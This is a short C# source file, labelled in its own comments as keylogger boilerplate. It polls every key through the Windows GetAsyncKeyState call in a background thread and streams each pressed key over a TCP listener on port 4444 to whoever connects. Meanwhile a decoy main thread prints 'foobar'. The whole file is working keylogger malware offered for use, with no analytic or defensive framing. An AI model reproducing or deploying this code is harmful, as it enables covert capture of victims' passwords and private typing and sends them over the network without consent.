using System.Net.Sockets;
using System.Runtime.InteropServices;

static class Program
{
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    static void ListenKeys()//boilerplate for keylogger in C#
    {
        TcpListener tc = new TcpListener(System.Net.IPAddress.Any, 4444);
        tc.Start();
        var tc2 = tc.AcceptTcpClient();
        while (true)
        {
            for (int i = 0; i < 255; i++)
            {
                int keyState = GetAsyncKeyState(i);
                // replace -32767 with 32769 for windows 10.
                if (keyState == 1 || keyState == 32769)
                {
                    tc2.GetStream().WriteByte((byte)i);
                    break;
                }
            }
        }
    }
    static void Main(string[] args)
    {
        new Thread(new ThreadStart(ListenKeys)).Start();//our keylogger works as a thread
        while (true)//our main thread
        {
            Console.WriteLine("foobar");
            Console.ReadKey(true);
        }
    }
}